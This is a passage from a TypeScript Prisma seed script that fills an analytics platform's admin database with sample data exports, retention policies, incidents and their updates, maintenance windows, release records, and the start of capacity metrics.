        requestedAt: new Date(now.getTime() - 2 * 60 * 60 * 1000),
      },
      {
        orgId: acmeCorp.id,
        requestedBy: janeSmith.id,
        type: 'AUDIT_LOG',
        status: 'COMPLETED',
        scope: { logTypes: ['user_activity', 'data_access'], period: 'last_90_days' },
        format: 'CSV',
        fileUrl: 'https://exports.gwi.com/audit/acme-audit-q4.csv',
        fileSize: 8945632,
        recordCount: 125789,
        requestedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000),
        completedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000 + 3600000),
        expiresAt: new Date(now.getTime() + 20 * 24 * 60 * 60 * 1000),
      },
      {
        orgId: enterpriseCo.id,
        requestedBy: sarahEnterprise.id,
        type: 'LEGAL_HOLD',
        status: 'COMPLETED',
        legalHoldId: legalHold1.id,
        scope: { holdId: legalHold1.id, custodians: [johnDoe.id, janeSmith.id] },
        format: 'ZIP',
        fileUrl: 'https://exports.gwi.com/legal/smith-v-datacorp-export.zip',
        fileSize: 256789432,
        recordCount: 567890,
        requestedAt: new Date(now.getTime() - 15 * 24 * 60 * 60 * 1000),
        completedAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
        expiresAt: new Date(now.getTime() + 180 * 24 * 60 * 60 * 1000),
      },
      {
        orgId: techStartup.id,
        requestedBy: bobWilson.id,
        type: 'ANALYTICS',
        status: 'FAILED',
        scope: { metrics: ['all'], aggregation: 'daily' },
        format: 'PARQUET',
        recordCount: 0,
        requestedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
        error: 'Export failed: Insufficient storage quota',
      },
      {
        orgId: acmeCorp.id,
        requestedBy: adminUser.id,
        type: 'COMPLIANCE',
        status: 'PENDING_APPROVAL',
        scope: { framework: 'SOC2', period: '2024', includeEvidence: true },
        format: 'PDF',
        recordCount: 0,
        requestedAt: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
        approvalRequired: true,
        approvers: [superAdmin?.id || 'system'],
      },
      {
        orgId: enterpriseCo.id,
        type: 'GDPR_DELETION',
        status: 'COMPLETED',
        scope: { userId: 'deleted-user-123', deleteType: 'full_erasure' },
        format: 'JSON',
        fileUrl: 'https://exports.gwi.com/deletion/confirmation-123.json',
        fileSize: 1024,
        recordCount: 15678,
        requestedAt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000),
        completedAt: new Date(now.getTime() - 29 * 24 * 60 * 60 * 1000),
      },
      // Additional data exports to reach 10
      {
        orgId: enterpriseCo.id,
        requestedBy: sarahEnterprise.id,
        type: 'SECURITY_AUDIT',
        status: 'COMPLETED',
        scope: { auditType: 'access_review', period: 'Q4_2024' },
        format: 'PDF',
        fileUrl: 'https://exports.gwi.com/security/enterprise-access-review-q4.pdf',
        fileSize: 5234567,
        recordCount: 45678,
        requestedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
        completedAt: new Date(now.getTime() - 6 * 24 * 60 * 60 * 1000),
        expiresAt: new Date(now.getTime() + 90 * 24 * 60 * 60 * 1000),
      },
      {
        orgId: acmeCorp.id,
        requestedBy: janeSmith.id,
        type: 'USER_DATA',
        status: 'QUEUED',
        scope: { users: 'all_active', fields: ['profile', 'preferences', 'activity_summary'] },
        format: 'CSV',
        recordCount: 0,
        requestedAt: new Date(now.getTime() - 1 * 60 * 60 * 1000),
      },
      {
        orgId: techStartup.id,
        requestedBy: bobWilson.id,
        type: 'BACKUP',
        status: 'COMPLETED',
        scope: { fullBackup: true, includeAttachments: true },
        format: 'ZIP',
        fileUrl: 'https://exports.gwi.com/backup/techstartup-full-2025-01.zip',
        fileSize: 1567890123,
        recordCount: 234567,
        requestedAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000),
        completedAt: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
        expiresAt: new Date(now.getTime() + 30 * 24 * 60 * 60 * 1000),
      },
    ]
  })

  // ==================== DATA RETENTION POLICIES ====================
  console.log('🗄️ Creating data retention policies...')

  await prisma.dataRetentionPolicy.createMany({
    data: [
      {
        name: 'User Activity Logs',
        dataType: 'ACTIVITY_LOGS',
        retentionPeriod: 365,
        description: 'Retain user activity logs for compliance and security analysis',
        scope: { logTypes: ['login', 'api_access', 'data_view', 'export'] },
        deletionMethod: 'HARD_DELETE',
        isActive: true,
        lastExecuted: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
        nextExecution: new Date(now.getTime() + 6 * 24 * 60 * 60 * 1000),
        legalBasis: 'Legitimate interest - security monitoring',
      },
      {
        name: 'Audit Trail Records',
        dataType: 'AUDIT_LOGS',
        retentionPeriod: 2555,
        description: 'Retain audit trails for 7 years per regulatory requirements',
        scope: { logTypes: ['admin_actions', 'data_changes', 'access_control'] },
        deletionMethod: 'ARCHIVE',
        archiveLocation: 's3://gwi-compliance-archive/audit-logs/',
        isActive: true,
        lastExecuted: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
        nextExecution: new Date(now.getTime() + 23 * 24 * 60 * 60 * 1000),
        legalBasis: 'Legal obligation - SOX compliance',
      },
      {
        name: 'Customer Analytics Data',
        dataType: 'ANALYTICS_DATA',
        retentionPeriod: 730,
        description: 'Retain customer analytics data for 2 years',
        scope: { dataTypes: ['surveys', 'responses', 'insights'] },
        deletionMethod: 'ANONYMIZE',
        isActive: true,
        lastExecuted: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
        nextExecution: new Date(now.getTime() + 16 * 24 * 60 * 60 * 1000),
        legalBasis: 'Contract performance',
      },
      {
        name: 'Session Data',
        dataType: 'SESSION_DATA',
        retentionPeriod: 30,
        description: 'Short-term retention for session data',
        scope: { dataTypes: ['session_tokens', 'temp_files', 'cache'] },
        deletionMethod: 'HARD_DELETE',
        isActive: true,
        lastExecuted: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
        nextExecution: new Date(now.getTime() + 1 * 24 * 60 * 60 * 1000),
        legalBasis: 'Data minimization',
      },
      {
        name: 'Marketing Preferences',
        dataType: 'MARKETING_DATA',
        retentionPeriod: 1095,
        description: 'Retain marketing consent records for 3 years after last interaction',
        scope: { dataTypes: ['consent_records', 'preferences', 'opt_outs'] },
        deletionMethod: 'SOFT_DELETE',
        isActive: true,
        legalBasis: 'Consent - GDPR Art. 7',
      },
      {
        name: 'Deleted Account Data',
        dataType: 'ACCOUNT_DATA',
        retentionPeriod: 90,
        description: 'Grace period for deleted accounts before permanent removal',
        scope: { dataTypes: ['profile', 'settings', 'connections'] },
        deletionMethod: 'STAGED_DELETE',
        isActive: true,
        lastExecuted: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
        nextExecution: new Date(now.getTime() + 4 * 24 * 60 * 60 * 1000),
        legalBasis: 'User request - GDPR Art. 17',
      },
      // Additional retention policies to reach 10
      {
        name: 'Financial Transaction Records',
        dataType: 'FINANCIAL_DATA',
        retentionPeriod: 2555,
        description: 'Retain financial records for 7 years per SOX requirements',
        scope: { dataTypes: ['invoices', 'payments', 'subscriptions', 'refunds'] },
        deletionMethod: 'ARCHIVE',
        archiveLocation: 's3://gwi-compliance-archive/financial/',
        isActive: true,
        legalBasis: 'Legal obligation - SOX Section 802',
      },
      {
        name: 'Support Ticket History',
        dataType: 'SUPPORT_DATA',
        retentionPeriod: 1825,
        description: 'Retain support tickets for 5 years for quality assurance',
        scope: { dataTypes: ['tickets', 'responses', 'attachments', 'ratings'] },
        deletionMethod: 'ANONYMIZE',
        isActive: true,
        lastExecuted: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000),
        nextExecution: new Date(now.getTime() + 30 * 24 * 60 * 60 * 1000),
        legalBasis: 'Legitimate interest - service improvement',
      },
      {
        name: 'Security Event Logs',
        dataType: 'SECURITY_LOGS',
        retentionPeriod: 365,
        description: 'Retain security events for forensic investigation capability',
        scope: { dataTypes: ['auth_events', 'threat_detections', 'policy_violations'] },
        deletionMethod: 'ARCHIVE',
        archiveLocation: 's3://gwi-security-archive/events/',
        isActive: true,
        lastExecuted: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
        nextExecution: new Date(now.getTime() + 6 * 24 * 60 * 60 * 1000),
        legalBasis: 'Legitimate interest - security monitoring',
      },
      {
        name: 'API Request Logs',
        dataType: 'API_LOGS',
        retentionPeriod: 90,
        description: 'Short-term retention for API debugging and monitoring',
        scope: { dataTypes: ['request_logs', 'response_logs', 'error_logs'] },
        deletionMethod: 'HARD_DELETE',
        isActive: true,
        lastExecuted: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
        nextExecution: new Date(now.getTime() + 1 * 24 * 60 * 60 * 1000),
        legalBasis: 'Data minimization',
      },
    ]
  })

  // ==================== PLATFORM INCIDENTS ====================
  console.log('🚨 Creating platform incidents...')

  const incident1 = await prisma.platformIncident.create({
    data: {
      title: 'API Gateway Latency Spike',
      description: 'Elevated API response times detected across all endpoints. P99 latency increased from 200ms to 2500ms.',
      severity: 'MAJOR',
      status: 'RESOLVED',
      affectedServices: ['API Gateway', 'Authentication Service', 'Data Export'],
      affectedRegions: ['us-east-1', 'eu-west-1'],
      startedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
      resolvedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000 + 2 * 60 * 60 * 1000),
      rootCause: 'Database connection pool exhaustion due to increased traffic from batch processing jobs',
      resolution: 'Increased connection pool size and implemented connection timeout optimization',
      postmortemUrl: 'https://docs.gwi.com/postmortems/2025-01-10-api-latency',
      impactSummary: { affectedOrgs: 45, failedRequests: 12500, dataLoss: false },
    }
  })

  const incident2 = await prisma.platformIncident.create({
    data: {
      title: 'Authentication Service Partial Outage',
      description: 'Users experiencing intermittent login failures. OAuth2 token refresh failing for approximately 30% of requests.',
      severity: 'CRITICAL',
      status: 'RESOLVED',
      affectedServices: ['Authentication Service', 'SSO Integration'],
      affectedRegions: ['us-east-1'],
      startedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
      resolvedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000 + 45 * 60 * 1000),
      rootCause: 'Redis cluster failover triggered by memory pressure, causing session cache invalidation',
      resolution: 'Implemented Redis sentinel with automatic failover and increased memory allocation',
      postmortemUrl: 'https://docs.gwi.com/postmortems/2025-01-06-auth-outage',
      impactSummary: { affectedUsers: 2500, loginFailures: 8900, duration: '45 minutes' },
    }
  })

  const incident3 = await prisma.platformIncident.create({
    data: {
      title: 'Data Export Service Degradation',
      description: 'Large data exports timing out. Exports over 100MB failing consistently.',
      severity: 'MINOR',
      status: 'CONTAINED',
      affectedServices: ['Data Export', 'Report Generation'],
      startedAt: new Date(now.getTime() - 12 * 60 * 60 * 1000),
      impactSummary: { affectedExports: 23, workaround: 'Split exports into smaller chunks' },
    }
  })

  const incident4 = await prisma.platformIncident.create({
    data: {
      title: 'Scheduled Maintenance - Database Upgrade',
      description: 'Planned maintenance for PostgreSQL version upgrade from 14 to 16.',
      severity: 'MAINTENANCE',
      status: 'SCHEDULED',
      affectedServices: ['All Services'],
      affectedRegions: ['us-east-1', 'eu-west-1', 'ap-southeast-1'],
      scheduledStart: new Date(now.getTime() + 5 * 24 * 60 * 60 * 1000),
      scheduledEnd: new Date(now.getTime() + 5 * 24 * 60 * 60 * 1000 + 4 * 60 * 60 * 1000),
      impactSummary: { expectedDowntime: '4 hours', dataLoss: false },
    }
  })

  const incident5 = await prisma.platformIncident.create({
    data: {
      title: 'CDN Cache Invalidation Delay',
      description: 'Static assets not updating after deployments. Cache invalidation taking longer than expected.',
      severity: 'MINOR',
      status: 'RESOLVED',
      affectedServices: ['Web Application', 'Dashboard'],
      startedAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
      resolvedAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000 + 6 * 60 * 60 * 1000),
      rootCause: 'CDN provider experiencing global propagation delays',
      resolution: 'Implemented cache versioning and added fallback to origin server',
    }
  })

  const incident6 = await prisma.platformIncident.create({
    data: {
      title: 'Webhook Delivery Backlog',
      description: 'Webhook deliveries delayed by up to 30 minutes due to queue backlog.',
      severity: 'MAJOR',
      status: 'OPEN',
      affectedServices: ['Webhook Service', 'Event Processing'],
      startedAt: new Date(now.getTime() - 4 * 60 * 60 * 1000),
      impactSummary: { delayedWebhooks: 15000, maxDelay: '30 minutes' },
    }
  })

  // Additional incidents to reach 10
  await prisma.platformIncident.create({
    data: {
      title: 'Search Index Corruption',
      description: 'Search results returning incorrect or missing data due to index corruption.',
      severity: 'MAJOR',
      status: 'RESOLVED',
      affectedServices: ['Search Engine', 'Dashboard Queries'],
      affectedRegions: ['us-east-1', 'eu-west-1'],
      startedAt: new Date(now.getTime() - 21 * 24 * 60 * 60 * 1000),
      resolvedAt: new Date(now.getTime() - 21 * 24 * 60 * 60 * 1000 + 4 * 60 * 60 * 1000),
      rootCause: 'Index rebuild failed silently during scheduled maintenance',
      resolution: 'Full index rebuild from source data with validation checks',
      postmortemUrl: 'https://docs.gwi.com/postmortems/2024-12-24-search-index',
      impactSummary: { affectedSearches: 45000, dataInconsistencies: 1200, duration: '4 hours' },
    }
  })

  await prisma.platformIncident.create({
    data: {
      title: 'EU Region Elevated Error Rates',
      description: 'Increased 5xx error rates in EU region affecting dashboard loads.',
      severity: 'MINOR',
      status: 'RESOLVED',
      affectedServices: ['Web Application', 'Dashboard'],
      affectedRegions: ['eu-west-1'],
      startedAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
      resolvedAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000 + 90 * 60 * 1000),
      rootCause: 'Misconfigured load balancer health check causing premature instance cycling',
      resolution: 'Corrected health check configuration and extended timeout',
      impactSummary: { errorRate: '8%', normalRate: '0.1%', affectedRegion: 'EU' },
    }
  })

  await prisma.platformIncident.create({
    data: {
      title: 'Email Notification Delays',
      description: 'Email notifications delayed by up to 2 hours due to third-party provider issues.',
      severity: 'MINOR',
      status: 'RESOLVED',
      affectedServices: ['Notification Service', 'Email Delivery'],
      startedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000),
      resolvedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000 + 3 * 60 * 60 * 1000),
      rootCause: 'SendGrid experiencing regional outage',
      resolution: 'Failover to backup email provider completed',
      impactSummary: { delayedEmails: 25000, maxDelay: '2 hours' },
    }
  })

  await prisma.platformIncident.create({
    data: {
      title: 'Billing System Unavailable',
      description: 'Billing portal and subscription management temporarily unavailable.',
      severity: 'CRITICAL',
      status: 'RESOLVED',
      affectedServices: ['Billing Portal', 'Subscription Management', 'Payment Processing'],
      startedAt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000),
      resolvedAt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000 + 2 * 60 * 60 * 1000),
      rootCause: 'Stripe API authentication failure due to expired API key',
      resolution: 'Rotated API keys and implemented key expiration monitoring',
      postmortemUrl: 'https://docs.gwi.com/postmortems/2024-12-14-billing-outage',
      impactSummary: { failedPayments: 45, affectedSubscriptions: 0, revenueImpact: '$0' },
    }
  })

  // ==================== INCIDENT UPDATES ====================
  console.log('📝 Creating incident updates...')

  await prisma.incidentUpdate.createMany({
    data: [
      { incidentId: incident1.id, status: 'OPEN', message: 'We are investigating reports of elevated API latency.', postedBy: superAdmin?.id || 'system', postedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000) },
      { incidentId: incident1.id, status: 'IDENTIFIED', message: 'Root cause identified as database connection pool exhaustion. Working on mitigation.', postedBy: superAdmin?.id || 'system', postedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000 + 30 * 60 * 1000) },
      { incidentId: incident1.id, status: 'CONTAINED', message: 'Fix deployed. Monitoring for stability.', postedBy: platformAdmin?.id || 'system', postedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000 + 90 * 60 * 1000) },
      { incidentId: incident1.id, status: 'RESOLVED', message: 'Incident resolved. All systems operating normally. Full postmortem to follow.', postedBy: superAdmin?.id || 'system', postedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000 + 2 * 60 * 60 * 1000) },
      { incidentId: incident2.id, status: 'OPEN', message: 'We are aware of login issues affecting some users and are investigating.', postedBy: superAdmin?.id || 'system', postedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000) },
      { incidentId: incident2.id, status: 'IDENTIFIED', message: 'Issue traced to Redis cluster. Implementing fix.', postedBy: superAdmin?.id || 'system', postedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000 + 20 * 60 * 1000) },
      { incidentId: incident2.id, status: 'RESOLVED', message: 'Authentication service restored. All users should be able to log in normally.', postedBy: superAdmin?.id || 'system', postedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000 + 45 * 60 * 1000) },
      { incidentId: incident3.id, status: 'OPEN', message: 'We are investigating reports of export timeouts for large datasets.', postedBy: platformAdmin?.id || 'system', postedAt: new Date(now.getTime() - 12 * 60 * 60 * 1000) },
      { incidentId: incident3.id, status: 'IDENTIFIED', message: 'Issue identified. Workaround: Please split exports into chunks smaller than 100MB while we work on a fix.', postedBy: platformAdmin?.id || 'system', postedAt: new Date(now.getTime() - 10 * 60 * 60 * 1000) },
      { incidentId: incident6.id, status: 'OPEN', message: 'We are investigating delayed webhook deliveries.', postedBy: platformAdmin?.id || 'system', postedAt: new Date(now.getTime() - 4 * 60 * 60 * 1000) },
      { incidentId: incident6.id, status: 'IDENTIFIED', message: 'Queue backlog identified. Scaling up workers to process backlog.', postedBy: platformAdmin?.id || 'system', postedAt: new Date(now.getTime() - 3 * 60 * 60 * 1000) },
    ]
  })

  // ==================== MAINTENANCE WINDOWS ====================
  console.log('🔧 Creating maintenance windows...')

  await prisma.maintenanceWindow.createMany({
    data: [
      {
        title: 'Database Version Upgrade',
        description: 'Upgrading PostgreSQL from version 14 to 16 for improved performance and security.',
        type: 'PLANNED',
        status: 'SCHEDULED',
        scheduledStart: new Date(now.getTime() + 5 * 24 * 60 * 60 * 1000),
        scheduledEnd: new Date(now.getTime() + 5 * 24 * 60 * 60 * 1000 + 4 * 60 * 60 * 1000),
        affectedServices: ['All Services'],
        affectedRegions: ['us-east-1', 'eu-west-1', 'ap-southeast-1'],
        impact: 'FULL_OUTAGE',
        notificationsSent: true,
        createdBy: superAdmin?.id || 'system',
      },
      {
        title: 'Security Patch Deployment',
        description: 'Rolling deployment of critical security patches across all application servers.',
        type: 'PLANNED',
        status: 'SCHEDULED',
        scheduledStart: new Date(now.getTime() + 2 * 24 * 60 * 60 * 1000),
        scheduledEnd: new Date(now.getTime() + 2 * 24 * 60 * 60 * 1000 + 2 * 60 * 60 * 1000),
        affectedServices: ['API Gateway', 'Web Application'],
        impact: 'DEGRADED',
        notificationsSent: true,
        createdBy: platformAdmin?.id || 'system',
      },
      {
        title: 'Network Infrastructure Upgrade',
        description: 'Upgrading network switches in primary datacenter for improved throughput.',
        type: 'PLANNED',
        status: 'COMPLETED',
        scheduledStart: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000),
        scheduledEnd: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000 + 6 * 60 * 60 * 1000),
        actualStart: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000 + 15 * 60 * 1000),
        actualEnd: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000 + 5 * 60 * 60 * 1000),
        affectedServices: ['All Services'],
        affectedRegions: ['us-east-1'],
        impact: 'PARTIAL_OUTAGE',
        notificationsSent: true,
        postMaintenanceNotes: 'Completed 1 hour ahead of schedule. Network throughput improved by 40%.',
        createdBy: superAdmin?.id || 'system',
      },
      {
        title: 'SSL Certificate Renewal',
        description: 'Renewing SSL certificates for all production domains.',
        type: 'PLANNED',
        status: 'SCHEDULED',
        scheduledStart: new Date(now.getTime() + 14 * 24 * 60 * 60 * 1000),
        scheduledEnd: new Date(now.getTime() + 14 * 24 * 60 * 60 * 1000 + 30 * 60 * 1000),
        affectedServices: ['Web Application', 'API Gateway'],
        impact: 'NONE',
        notificationsSent: false,
        createdBy: platformAdmin?.id || 'system',
      },
      {
        title: 'Emergency Redis Cluster Maintenance',
        description: 'Emergency maintenance to address memory issues in Redis cluster.',
        type: 'EMERGENCY',
        status: 'COMPLETED',
        scheduledStart: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
        scheduledEnd: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000 + 2 * 60 * 60 * 1000),
        actualStart: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
        actualEnd: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000 + 45 * 60 * 1000),
        affectedServices: ['Authentication Service', 'Session Management'],
        impact: 'PARTIAL_OUTAGE',
        notificationsSent: true,
        postMaintenanceNotes: 'Redis memory increased and sentinel configuration optimized.',
        createdBy: superAdmin?.id || 'system',
      },
      // Additional maintenance windows to reach 10
      {
        title: 'Kubernetes Cluster Upgrade',
        description: 'Upgrading Kubernetes from 1.28 to 1.29 for improved security and features.',
        type: 'PLANNED',
        status: 'SCHEDULED',
        scheduledStart: new Date(now.getTime() + 21 * 24 * 60 * 60 * 1000),
        scheduledEnd: new Date(now.getTime() + 21 * 24 * 60 * 60 * 1000 + 6 * 60 * 60 * 1000),
        affectedServices: ['All Services'],
        affectedRegions: ['us-east-1', 'eu-west-1', 'ap-southeast-1'],
        impact: 'DEGRADED',
        notificationsSent: false,
        createdBy: superAdmin?.id || 'system',
      },
      {
        title: 'Elasticsearch Reindexing',
        description: 'Full reindex of search clusters for improved relevance.',
        type: 'PLANNED',
        status: 'SCHEDULED',
        scheduledStart: new Date(now.getTime() + 10 * 24 * 60 * 60 * 1000),
        scheduledEnd: new Date(now.getTime() + 10 * 24 * 60 * 60 * 1000 + 8 * 60 * 60 * 1000),
        affectedServices: ['Search Engine'],
        impact: 'DEGRADED',
        notificationsSent: true,
        createdBy: platformAdmin?.id || 'system',
      },
      {
        title: 'CDN Configuration Update',
        description: 'Updating CDN edge locations and caching rules.',
        type: 'PLANNED',
        status: 'COMPLETED',
        scheduledStart: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
        scheduledEnd: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000 + 1 * 60 * 60 * 1000),
        actualStart: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
        actualEnd: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000 + 45 * 60 * 1000),
        affectedServices: ['Static Assets', 'Image Delivery'],
        impact: 'NONE',
        notificationsSent: true,
        postMaintenanceNotes: 'CDN performance improved by 25% in APAC region.',
        createdBy: platformAdmin?.id || 'system',
      },
      {
        title: 'Backup System Migration',
        description: 'Migrating backup infrastructure to new provider with better retention.',
        type: 'PLANNED',
        status: 'IN_PROGRESS',
        scheduledStart: new Date(now.getTime() - 2 * 60 * 60 * 1000),
        scheduledEnd: new Date(now.getTime() + 4 * 60 * 60 * 1000),
        actualStart: new Date(now.getTime() - 2 * 60 * 60 * 1000),
        affectedServices: ['Backup Service'],
        impact: 'NONE',
        notificationsSent: true,
        createdBy: superAdmin?.id || 'system',
      },
      {
        title: 'API Rate Limiter Reconfiguration',
        description: 'Adjusting rate limits based on customer tier entitlements.',
        type: 'PLANNED',
        status: 'CANCELLED',
        scheduledStart: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
        scheduledEnd: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000 + 2 * 60 * 60 * 1000),
        affectedServices: ['API Gateway'],
        impact: 'NONE',
        notificationsSent: true,
        cancellationReason: 'Deferred to next sprint due to higher priority incident',
        createdBy: platformAdmin?.id || 'system',
      },
    ]
  })

  // ==================== RELEASE MANAGEMENT ====================
  console.log('🚀 Creating release management...')

  await prisma.releaseManagement.createMany({
    data: [
      {
        version: '2.5.0',
        name: 'Winter 2025 Release',
        description: 'Major release with new admin portal features, enhanced security controls, and performance improvements.',
        type: 'MAJOR',
        status: 'RELEASED',
        releaseDate: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
        changelog: [
          { type: 'feature', description: 'New Security Center with policy management' },
          { type: 'feature', description: 'Compliance framework tracking and attestations' },
          { type: 'feature', description: 'Enhanced audit logging with 7-year retention' },
          { type: 'improvement', description: 'API response time reduced by 40%' },
          { type: 'fix', description: 'Fixed SSO redirect loop for certain IdP configurations' },
        ],
        breakingChanges: [],
        rolloutPercentage: 100,
        rollbackPlan: 'Database migrations are backward compatible. Rollback via feature flags.',
        createdBy: superAdmin?.id || 'system',
      },
      {
        version: '2.4.2',
        name: 'Hotfix Release',
        description: 'Security hotfix addressing CVE-2025-1234.',
        type: 'PATCH',
        status: 'RELEASED',
        releaseDate: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
        changelog: [
          { type: 'security', description: 'Fixed XSS vulnerability in report viewer' },
          { type: 'fix', description: 'Fixed memory leak in long-running agent processes' },
        ],
        breakingChanges: [],
        rolloutPercentage: 100,
        createdBy: platformAdmin?.id || 'system',
      },
      {
        version: '2.4.1',
        name: 'Bug Fix Release',
        description: 'Bug fixes and minor improvements.',
        type: 'PATCH',
        status: 'RELEASED',
        releaseDate: new Date(now.getTime() - 21 * 24 * 60 * 60 * 1000),
        changelog: [
          { type: 'fix', description: 'Fixed PDF export timeout for large crosstabs' },
          { type: 'fix', description: 'Fixed timezone handling in scheduled reports' },
          { type: 'improvement', description: 'Improved error messages for API validation' },
        ],
        breakingChanges: [],
        rolloutPercentage: 100,
        createdBy: platformAdmin?.id || 'system',
      },
      {
        version: '2.6.0',
        name: 'Spring 2025 Release',
        description: 'Upcoming release with AI enhancements and new integration capabilities.',
        type: 'MAJOR',
        status: 'IN_DEVELOPMENT',
        targetDate: new Date(now.getTime() + 60 * 24 * 60 * 60 * 1000),
        changelog: [
          { type: 'feature', description: 'AI-powered insight recommendations' },
          { type: 'feature', description: 'Native Slack and Teams integrations' },
          { type: 'feature', description: 'Advanced SCIM provisioning' },
          { type: 'improvement', description: 'New dashboard builder with drag-and-drop' },
        ],
        breakingChanges: [
          { change: 'API v1 endpoints deprecated', migration: 'Use v2 endpoints. See migration guide.' },
        ],
        createdBy: superAdmin?.id || 'system',
      },
      {
        version: '2.5.1',
        name: 'January Maintenance Release',
        description: 'Scheduled maintenance release with performance optimizations.',
        type: 'MINOR',
        status: 'STAGED',
        targetDate: new Date(now.getTime() + 3 * 24 * 60 * 60 * 1000),
        changelog: [
          { type: 'improvement', description: 'Database query optimization for large datasets' },
          { type: 'improvement', description: 'Reduced memory footprint for background workers' },
          { type: 'fix', description: 'Fixed rare race condition in concurrent exports' },
        ],
        breakingChanges: [],
        rolloutPercentage: 25,
        rollbackPlan: 'Feature flags allow instant rollback without deployment.',
        createdBy: platformAdmin?.id || 'system',
      },
      {
        version: '2.5.2',
        name: 'February Bug Fix Release',
        description: 'Bug fixes based on customer feedback.',
        type: 'PATCH',
        status: 'PLANNED',
        targetDate: new Date(now.getTime() + 30 * 24 * 60 * 60 * 1000),
        changelog: [],
        breakingChanges: [],
        createdBy: platformAdmin?.id || 'system',
      },
      // Additional releases to reach 10
      {
        version: '2.4.0',
        name: 'Fall 2024 Release',
        description: 'Major release with new analytics capabilities.',
        type: 'MAJOR',
        status: 'RELEASED',
        releaseDate: new Date(now.getTime() - 60 * 24 * 60 * 60 * 1000),
        changelog: [
          { type: 'feature', description: 'New audience builder with advanced targeting' },
          { type: 'feature', description: 'Brand health tracking dashboard' },
          { type: 'improvement', description: 'Redesigned report templates' },
        ],
        breakingChanges: [],
        rolloutPercentage: 100,
        createdBy: superAdmin?.id || 'system',
      },
      {
        version: '2.3.5',
        name: 'Emergency Security Patch',
        description: 'Critical security update for authentication system.',
        type: 'PATCH',
        status: 'RELEASED',
        releaseDate: new Date(now.getTime() - 75 * 24 * 60 * 60 * 1000),
        changelog: [
          { type: 'security', description: 'Fixed authentication bypass vulnerability' },
          { type: 'security', description: 'Enhanced session token validation' },
        ],
        breakingChanges: [],
        rolloutPercentage: 100,
        createdBy: superAdmin?.id || 'system',
      },
      {
        version: '2.7.0',
        name: 'Summer 2025 Release',
        description: 'Major platform evolution with ML capabilities.',
        type: 'MAJOR',
        status: 'PLANNED',
        targetDate: new Date(now.getTime() + 120 * 24 * 60 * 60 * 1000),
        changelog: [
          { type: 'feature', description: 'Machine learning powered trend predictions' },
          { type: 'feature', description: 'Automated report generation' },
          { type: 'feature', description: 'Custom agent workflows' },
        ],
        breakingChanges: [
          { change: 'Legacy report format deprecated', migration: 'Use new report builder format' },
        ],
        createdBy: superAdmin?.id || 'system',
      },
      {
        version: '2.5.0-rc1',
        name: 'Winter 2025 Release Candidate',
        description: 'Release candidate for testing.',
        type: 'MAJOR',
        status: 'RELEASED',
        releaseDate: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
        changelog: [
          { type: 'feature', description: 'All features from 2.5.0' },
        ],
        breakingChanges: [],
        rolloutPercentage: 10,
        rollbackPlan: 'Instant rollback to 2.4.2 available.',
        createdBy: platformAdmin?.id || 'system',
      },
    ]
  })

  // ==================== CAPACITY METRICS ====================
  console.log('📊 Creating capacity metrics...')

  const services = ['API Gateway', 'Authentication', 'Data Processing', 'Export Service', 'Webhook Service', 'Search Engine', 'Cache Layer']
  const capacityMetrics = []

  for (const service of services) {
    capacityMetrics.push({
      service,
      region: 'us-east-1',
      metricType: 'CPU',
      currentValue: 45 + Math.random() * 30,
      maxValue: 100,
      threshold: 80,
      unit: 'percent',
      trend: Math.random() > 0.5 ? 'INCREASING' : 'STABLE',
      forecast: { nextWeek: 55 + Math.random() * 20, nextMonth: 60 + Math.random() * 25 },
    })
    capacityMetrics.push({
      service,
      region: 'us-east-1',
